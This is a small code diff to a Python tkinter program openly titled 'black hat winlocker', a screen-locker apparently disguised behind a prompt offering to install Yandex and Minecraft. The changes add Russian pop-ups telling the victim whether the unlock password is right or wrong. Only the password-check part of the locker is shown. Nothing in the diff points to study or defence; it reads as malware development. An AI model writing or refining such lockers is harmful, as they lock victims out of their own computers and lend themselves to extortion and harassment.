@@ -27,8 +27,11 @@ input('установить яндекс,яндекс игры, майнкраф
 
 def check_input(event=None):
     user_input = entry.get().strip()  
-    if user_input == f"{parol}":  
+    if user_input == f"{parol}": 
+        messagebox.showinfo("молодец!", "пароль верный! можешь пользоватся системой :)")
         root.destroy()  
+    else:
+        messagebox.showinfo("упс!", "неверный пароль!")
 
 root = tk.Tk()
 root.title("black hat winlocker")
@@ -83,3 +86,4 @@ label.pack()
 
 
 root.mainloop()
+
